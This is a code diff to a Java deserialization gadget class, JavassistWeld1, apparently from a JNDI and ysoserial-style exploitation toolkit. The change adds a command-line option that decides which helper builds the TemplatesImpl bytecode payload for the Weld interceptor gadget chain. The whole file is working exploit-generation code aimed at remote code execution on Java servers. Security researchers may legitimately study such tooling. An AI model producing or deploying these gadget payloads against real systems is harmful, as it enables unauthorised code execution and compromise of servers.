@@ -4,6 +4,7 @@ import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
+import com.qi4l.jndi.gadgets.utils.GadgetsYso;
 import com.qi4l.jndi.gadgets.utils.Reflections;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import org.jboss.weld.interceptor.builder.InterceptionModelBuilder;
@@ -23,6 +24,8 @@ import org.jboss.weld.interceptor.spi.model.InterceptionType;
 import java.lang.reflect.Constructor;
 import java.util.*;
 
+import static com.qi4l.jndi.Starter.cmdLine;
+
 /*
     by @matthias_kaiser
 */
@@ -34,7 +37,12 @@ import java.util.*;
 public class JavassistWeld1 implements ObjectPayload<Object> {
 
     public Object getObject(PayloadType type, String... param) throws Exception {
-        final Object tpl = Gadgets.createTemplatesImpl(type, param);
+        final Object tpl;
+        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+            tpl = GadgetsYso.createTemplatesImpl(param[0]);
+        } else {
+            tpl = Gadgets.createTemplatesImpl(type, param);
+        }
 
         InterceptionModelBuilder builder              = InterceptionModelBuilder.newBuilderFor(HashMap.class);
         ReflectiveClassMetadata metadata             = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
